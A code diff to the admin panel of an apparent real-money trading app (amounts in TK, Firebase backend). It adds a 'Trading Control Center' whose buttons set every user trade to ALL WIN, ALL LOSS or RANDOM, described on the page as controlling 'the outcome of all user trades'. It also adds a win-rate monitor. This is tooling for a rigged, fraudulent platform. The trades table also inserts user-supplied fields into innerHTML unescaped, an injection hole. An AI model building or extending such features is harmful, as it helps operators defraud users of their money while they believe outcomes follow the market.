@@ -350,6 +350,124 @@
             width: 90%;
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
+
+        /* ===== NEW TRADING CONTROL STYLES ===== */
+        .trading-control-card {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+        .trading-control-card h3 {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .control-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .btn-all-win {
+            background: linear-gradient(135deg, #00c853, #00e676);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        .btn-all-win:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(0, 200, 83, 0.4);
+        }
+        .btn-all-loss {
+            background: linear-gradient(135deg, #ff3d00, #ff6600);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        .btn-all-loss:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(255, 61, 0, 0.4);
+        }
+        .btn-random {
+            background: linear-gradient(135deg, #9c27b0, #e91e63);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        .btn-random:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(156, 39, 176, 0.4);
+        }
+        .trading-status {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            text-align: center;
+        }
+        .trading-status h4 {
+            margin-bottom: 10px;
+            opacity: 0.8;
+        }
+        .status-indicator {
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+        .status-win {
+            background: rgba(0, 200, 83, 0.3);
+            color: #00e676;
+            border: 2px solid #00e676;
+        }
+        .status-loss {
+            background: rgba(255, 61, 0, 0.3);
+            color: #ff6e40;
+            border: 2px solid #ff6e40;
+        }
+        .status-random {
+            background: rgba(156, 39, 176, 0.3);
+            color: #e91e63;
+            border: 2px solid #e91e63;
+        }
+        .trading-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .trading-stat-item {
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+        }
+        .trading-stat-item label {
+            font-size: 0.75rem;
+            opacity: 0.7;
+            display: block;
+        }
+        .trading-stat-item value {
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
@@ -373,6 +491,37 @@
                     <h3 id="total-user-count">0</h3>
                     <p>Total Registered Users</p>
                 </div>
+                
+                <!-- ===== NEW TRADING CONTROL SECTION ===== -->
+                <div class="trading-control-card">
+                    <h3><i class="fas fa-chart-line"></i> Trading Control Center</h3>
+                    <div class="trading-status">
+                        <h4>Current Market Mode</h4>
+                        <span id="trading-mode-display" class="status-indicator status-random">RANDOM</span>
+                    </div>
+                    <div class="control-buttons">
+                        <button class="btn-all-win" onclick="window.setTradingMode('win')">
+                            <i class="fas fa-arrow-up"></i><br>ALL WIN
+                        </button>
+                        <button class="btn-all-loss" onclick="window.setTradingMode('loss')">
+                            <i class="fas fa-arrow-down"></i><br>ALL LOSS
+                        </button>
+                        <button class="btn-random" onclick="window.setTradingMode('random')">
+                            <i class="fas fa-random"></i><br>RANDOM
+                        </button>
+                    </div>
+                    <div class="trading-stats">
+                        <div class="trading-stat-item">
+                            <label>Total Trades</label>
+                            <value id="total-trades-count">0</value>
+                        </div>
+                        <div class="trading-stat-item">
+                            <label>Active Traders</label>
+                            <value id="active-traders-count">0</value>
+                        </div>
+                    </div>
+                </div>
+                <!-- ===== END TRADING CONTROL SECTION ===== -->
                 
                 <div class="menu-grid" style="margin-top: 20px;">
                     <div class="menu-card" onclick="window.showAdminSection('market')">
@@ -402,6 +551,11 @@
                     <div class="menu-card" onclick="window.showAdminSection('savings')">
                         <span class="menu-icon text-green"><i class="fas fa-piggy-bank"></i></span>
                         <div>Savings</div>
+                    </div>
+                    <!-- ===== NEW TRADING MENU CARD ===== -->
+                    <div class="menu-card" onclick="window.showAdminSection('trading')">
+                        <span class="menu-icon" style="color: #e91e63;"><i class="fas fa-exchange-alt"></i></span>
+                        <div>Trading</div>
                     </div>
                 </div>
 
@@ -629,6 +783,69 @@
                     </table>
                 </div>
             </section>
+
+            <!-- ===== NEW TRADING MANAGEMENT SECTION ===== -->
+            <section id="admin-trading" class="section hidden">
+                <button class="btn btn-sm btn-outline" onclick="window.showAdminSection('dashboard')">Back</button>
+                <h3 class="text-orange" style="margin-top: 15px;"><i class="fas fa-exchange-alt"></i> Trading Management</h3>
+                
+                <div class="trading-control-card" style="margin-top: 20px;">
+                    <h3><i class="fas fa-sliders-h"></i> Market Control Panel</h3>
+                    <p style="opacity: 0.8; margin-bottom: 15px;">Control the outcome of all user trades</p>
+                    
+                    <div class="trading-status">
+                        <h4>Current Trading Mode</h4>
+                        <span id="admin-trading-mode-display" class="status-indicator status-random">RANDOM</span>
+                    </div>
+                    
+                    <div class="control-buttons">
+                        <button class="btn-all-win" onclick="window.setTradingMode('win')">
+                            <i class="fas fa-arrow-up"></i><br>ALL WIN
+                        </button>
+                        <button class="btn-all-loss" onclick="window.setTradingMode('loss')">
+                            <i class="fas fa-arrow-down"></i><br>ALL LOSS
+                        </button>
+                        <button class="btn-random" onclick="window.setTradingMode('random')">
+                            <i class="fas fa-random"></i><br>RANDOM
+                        </button>
+                    </div>
+                    
+                    <!-- Minimum Trade Setting -->
+                    <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; margin-top: 15px;">
+                        <h4 style="margin-bottom: 10px; opacity: 0.9;"><i class="fas fa-coins"></i> Minimum Trade Amount</h4>
+                        <div style="display: flex; gap: 10px; align-items: center;">
+                            <input type="number" id="admin-min-trade" value="1" min="1" style="flex: 1; padding: 10px; border-radius: 6px; border: none; background: rgba(0,0,0,0.3); color: white; font-size: 1rem;">
+                            <span style="color: #aaa;">TK</span>
+                            <button class="btn btn-sm" onclick="window.updateMinTrade()" style="background: var(--primary); width: auto;">
+                                <i class="fas fa-save"></i> Save
+                            </button>
+                        </div>
+                        <small style="color: #aaa; display: block; margin-top: 8px;">Users cannot place trades below this amount</small>
+                    </div>
+                </div>
+
+                <div class="summary-grid" style="margin-top: 20px;">
+                    <div class="summary-card">
+                        <h4>Total Trades Today</h4>
+                        <div class="amount text-orange" id="admin-total-trades">0</div>
+                    </div>
+                    <div class="summary-card">
+                        <h4>Win Rate</h4>
+                        <div class="amount text-green" id="admin-win-rate">0%</div>
+                    </div>
+                </div>
+
+                <h3 class="text-orange" style="margin: 20px 0 15px 0;">Recent Trades</h3>
+                <div style="overflow-x: auto;">
+                    <table class="admin-table">
+                        <thead>
+                            <tr><th>User</th><th>Type</th><th>Amount</th><th>Result</th><th>Time</th></tr>
+                        </thead>
+                        <tbody id="admin-trades-list"></tbody>
+                    </table>
+                </div>
+            </section>
+            <!-- ===== END TRADING MANAGEMENT SECTION ===== -->
 
             <!-- Admin: News -->
             <section id="admin-news" class="section hidden">
@@ -1012,6 +1229,10 @@
             if (sectionId === 'chat') loadAdminChatList();
             if (sectionId === 'summary') loadSummaryData();
             if (sectionId === 'savings') loadAdminSavings();
+            if (sectionId === 'trading') {
+                loadAdminTrading();
+                loadMinTradeSetting();
+            }
         };
 
         function loadAdminMarket() {
@@ -1740,6 +1961,171 @@
             }
             window.open(`https://www.google.com/maps?q=${currentIPData.lat},${currentIPData.lon}`, '_blank');
         };
+
+        // ===== NEW TRADING CONTROL FUNCTIONS =====
+        let currentTradingMode = 'random';
+
+        // Load trading mode from Firebase
+        onValue(ref(db, 'tradingControl'), (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                currentTradingMode = data.mode || 'random';
+                updateTradingModeDisplay();
+            }
+        });
+
+        function updateTradingModeDisplay() {
+            const displayElements = [
+                document.getElementById('trading-mode-display'),
+                document.getElementById('admin-trading-mode-display')
+            ];
+            
+            displayElements.forEach(el => {
+                if (!el) return;
+                
+                el.className = 'status-indicator';
+                
+                if (currentTradingMode === 'win') {
+                    el.classList.add('status-win');
+                    el.innerText = 'ALL WIN';
+                } else if (currentTradingMode === 'loss') {
+                    el.classList.add('status-loss');
+                    el.innerText = 'ALL LOSS';
+                } else {
+                    el.classList.add('status-random');
+                    el.innerText = 'RANDOM';
+                }
+            });
+        }
+
+        window.setTradingMode = (mode) => {
+            currentTradingMode = mode;
+            
+            const updates = {
+                'tradingControl/mode': mode,
+                'tradingControl/lastUpdated': Date.now(),
+                'tradingControl/updatedBy': 'admin'
+            };
+            
+            update(ref(db), updates).then(() => {
+                updateTradingModeDisplay();
+                
+                let modeText = '';
+                if (mode === 'win') modeText = 'ALL WIN';
+                else if (mode === 'loss') modeText = 'ALL LOSS';
+                else modeText = 'RANDOM';
+                
+                showToast(`Trading mode set to: ${modeText}`);
+            }).catch(err => {
+                showToast('Error updating trading mode', 'error');
+            });
+        };
+        
+        window.updateMinTrade = () => {
+            const minTrade = parseFloat(document.getElementById('admin-min-trade').value);
+            
+            if (!minTrade || minTrade < 1) {
+                showToast('Minimum trade must be at least 1 TK', 'error');
+                return;
+            }
+            
+            update(ref(db, 'tradingControl'), {
+                minTrade: minTrade,
+                lastUpdated: Date.now()
+            }).then(() => {
+                showToast(`Minimum trade amount set to: ${minTrade} TK`);
+            }).catch(err => {
+                showToast('Error updating minimum trade', 'error');
+            });
+        };
+        
+        function loadMinTradeSetting() {
+            onValue(ref(db, 'tradingControl/minTrade'), (snapshot) => {
+                const minTrade = snapshot.val() || 1;
+                const input = document.getElementById('admin-min-trade');
+                if (input) {
+                    input.value = minTrade;
+                }
+            });
+        }
+
+        function loadAdminTrading() {
+            // Load trading statistics
+            onValue(ref(db, 'trades'), (snapshot) => {
+                const data = snapshot.val();
+                let totalTrades = 0;
+                let winTrades = 0;
+                
+                if (data) {
+                    const today = new Date().toDateString();
+                    Object.values(data).forEach(trade => {
+                        const tradeDate = new Date(trade.timestamp).toDateString();
+                        if (tradeDate === today) {
+                            totalTrades++;
+                            if (trade.result === 'win') winTrades++;
+                        }
+                    });
+                }
+                
+                const winRate = totalTrades > 0 ? ((winTrades / totalTrades) * 100).toFixed(1) : 0;
+                
+                document.getElementById('admin-total-trades').innerText = totalTrades;
+                document.getElementById('admin-win-rate').innerText = winRate + '%';
+            });
+            
+            // Load recent trades list
+            const tradesList = document.getElementById('admin-trades-list');
+            onValue(ref(db, 'trades'), (snapshot) => {
+                const data = snapshot.val();
+                tradesList.innerHTML = '';
+                
+                if (!data) {
+                    tradesList.innerHTML = '<tr><td colspan="5" style="text-align:center; color:#777;">No trades yet</td></tr>';
+                    return;
+                }
+                
+                const trades = Object.entries(data)
+                    .map(([key, trade]) => ({ key, ...trade }))
+                    .sort((a, b) => b.timestamp - a.timestamp)
+                    .slice(0, 20);
+                
+                trades.forEach(trade => {
+                    const resultClass = trade.result === 'win' ? 'status-approved' : 'status-rejected';
+                    const resultText = trade.result === 'win' ? 'WIN' : 'LOSS';
+                    const time = new Date(trade.timestamp).toLocaleTimeString();
+                    
+                    tradesList.innerHTML += `
+                        <tr>
+                            <td>${trade.userEmail || 'Unknown'}</td>
+                            <td>${trade.type || 'N/A'}</td>
+                            <td>${trade.amount || 0} TK</td>
+                            <td><span class="status-badge ${resultClass}">${resultText}</span></td>
+                            <td>${time}</td>
+                        </tr>
+                    `;
+                });
+            });
+            
+            // Load active traders count
+            onValue(ref(db, 'users'), (snapshot) => {
+                const data = snapshot.val();
+                let activeTraders = 0;
+                
+                if (data) {
+                    Object.values(data).forEach(user => {
+                        if (user.lastActive) {
+                            const lastActive = new Date(user.lastActive).getTime();
+                            const now = Date.now();
+                            const diffMin = Math.floor((now - lastActive) / 60000);
+                            if (diffMin < 30) activeTraders++;
+                        }
+                    });
+                }
+                
+                document.getElementById('active-traders-count').innerText = activeTraders;
+            });
+        }
+        // ===== END TRADING CONTROL FUNCTIONS =====
 
         // Initialize user count on load
         updateUserCount();
